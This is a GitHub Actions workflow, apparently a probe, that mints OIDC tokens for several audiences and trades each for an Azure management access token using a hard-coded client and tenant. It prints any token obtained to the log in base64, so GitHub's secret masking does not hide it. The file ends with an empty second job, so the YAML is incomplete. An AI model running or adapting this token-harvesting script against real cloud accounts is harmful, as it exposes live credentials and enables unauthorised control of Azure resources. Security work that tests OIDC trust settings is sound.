name: c211-77sm-azure-oidc
on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  env_copilot_aud:
    name: env-copilot-aud
    runs-on: ubuntu-latest
    environment: copilot
    permissions:
      id-token: write
      contents: read
    steps:
      - name: multi-audience-exchange
        shell: bash
        run: |
          python3 - <<'PY'
          import json, os, base64, urllib.request, urllib.parse, urllib.error
          AUDS = ["api://AzureADTokenExchange","https://management.azure.com/","https://management.azure.com","api://c3443edf-23aa-4b6b-b1cf-d0c59c1d8a02","https://management.core.windows.net/"]
          def mint(aud):
              u = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + ("&" if "?" in os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] else "?") + "audience=" + urllib.parse.quote(aud)
              r = urllib.request.Request(u, headers={"Authorization": "bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
              return json.load(urllib.request.urlopen(r, timeout=30))["value"]
          for aud in AUDS:
              try:
                  tok = mint(aud)
              except Exception as e:
                  print("AUD", aud, "MINT_ERR", e); continue
              p = tok.split(".")[1]; p += "=" * (-len(p) % 4)
              claims = json.loads(base64.urlsafe_b64decode(p))
              body = urllib.parse.urlencode({"client_id":"c3443edf-23aa-4b6b-b1cf-d0c59c1d8a02","scope":"https://management.azure.com/.default","grant_type":"client_credentials","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":tok}).encode()
              req = urllib.request.Request("https://login.microsoftonline.com/a4aa23fd-b9db-4725-b9e3-dc27ca75c86c/oauth2/v2.0/token", data=body, headers={"Content-Type":"application/x-www-form-urlencoded"})
              try:
                  resp = urllib.request.urlopen(req, timeout=60); txt = resp.read().decode(); code = resp.status
              except urllib.error.HTTPError as e:
                  txt = e.read().decode(); code = e.code
              try:
                  j = json.loads(txt)
                  print("AUD", aud, "| SUB", claims.get("sub"), "| AAD_HTTP", code, "| ERR", j.get("error"), str(j.get("error_description"))[:200])
                  if "access_token" in j:
                      print("AAD_TOKEN_B64", base64.b64encode(j["access_token"].encode()).decode())
              except Exception:
                  print("AUD", aud, "| AAD_HTTP", code, "| BODY", txt[:300])
          PY

  ref_main_aud:
